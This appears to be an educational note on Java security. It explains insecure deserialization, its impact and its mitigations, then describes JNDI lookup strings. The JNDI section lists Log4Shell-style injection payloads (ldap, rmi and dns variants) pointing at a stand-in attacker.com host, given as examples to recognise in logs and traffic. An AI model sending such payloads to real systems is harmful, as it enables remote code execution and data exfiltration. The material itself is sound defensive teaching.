# Java Security

## Java Deserialization Issue
A Java Deserialization vulnerability (or insecure deserialization) occurs when an application reconstructs malicious, untrusted data
into Java objects without proper validation. This allows attackers to manipulate the application's logic or achieve remote code execution (RCE) by chaining together "gadgets" - existing classes in the application's classpath, that execute harmful side effects when deserialized.

### How the vulnerability works 
1. Serialization Vs. Deserialization: Serialization is the process of converting an in-memory Java object into a byte stream. 
Deserialization is the reverse process of turning that byte stream back into live Java object.
2. Bypassing the Constructor: During native Java deserialization, the object's constructor is passed. This means any validation
or security logic inside the constructor is never executed.
3. Gadgets and Reflection: An attacker creates a customized byte stream containing malicious objects. When deserialized, the readObject() method of certain classes executes reflectively. By linking multiple classes together (called a 'gadget chain'), the attacker triggers arbitrary methods, eventually running operating system commands or malicious code.

### Impact of the Exploit
1. Remote Code Execution (RCE): Attackers can execute arbitrary commands on the server.
2. Denial of Service (DDoS): Corrupted or deeply nested objects can crash the application.
3. Arbitrary File Access & Priviledge Escalation: Attackers can read sensitive configuration files or take over system accounts.

### Mitigation Strategies
1. Avoid untrusted deserialization: The best way to prevent the vulnerability is to never deserialize objects that originates 
from untrusted or unauthenticated clients. Use safer data interchange formats like JSON or XML for user input validation.
2. Implement serialization filters: Use Java's built-in serialization filtering mechanisms to define a whitelist of permitted 
classes. If an incoming object is of not on the whitelist, it is rejected.
3. Use Validation Logic: If your domain objects must implement Serializable, explicitly override the readObject() method to 
throw an exception, effectively blocking that specific class from deserialized.
4. Harden ObjectInputStream. Subclass ObjectInputStream to override the resolveClass() method. 


Ref: https://www.youtube.com/watch?v=zHZv2L9hDis&t=182s

## JNDI Strings
A JNDI String is a lookup path or URL used by Java applications to locate resources, data, or configuration settings via Java Naming and Directory Interface (JNDI). Depending on whether you are looking at standard Java development or cyber security, JNDI strings fall into main categories: Standard Environment Lookups and Remote Directory/Exploit URLs.

1. Standard JNDI Resource Strings (Development)
In traditional Java EE/Jakarta EE enterprise environments, applications use local context strings to fetch pre-configured resources like database pools or mail sessions.
A common standard string structure is:
java:comp/env/jdbc/MyDataSource

2. Remote Directory/Protocol URLs (Security & Injection)
JNDI can also resolve absolute URLs to fetch objects hosted on external directory servers. In security contexts (such as famous Log4Shell vulnerability), attackers abuse these strings to trigger remote lookups.
The general syntax for an external JNDI string is:
${jndi:[protocol]://[server-address]/[resource]}
Common protocol variations:
When analyzing network traffic, logs, or firewalls for potential JNDI injection attacks, we will see strings utilizing various underlying directory protocols:
1. LDAP: ${jndi:ldap://://attacker.com}
The most common vector. Directs the Java application to query a malicious Lightweight Directory Access Protocol (LDAP) server, which may respond with a payload that triggers arbitrary remote code execution.
2. RMI: ${jndi:rmi://://attacker.com}
Uses Java's Remote Method Invocation (RMI) registry to resolve and load remote objects.
3. DNS: ${jndi:dns://://attacker.com}
Frequently used by attackers for basic scanning, network reconnaissance, or data exfiltration via DNS queries.
4. Other protocols:  Less common protocols include iiop:// (Corba), nis://, and nds://

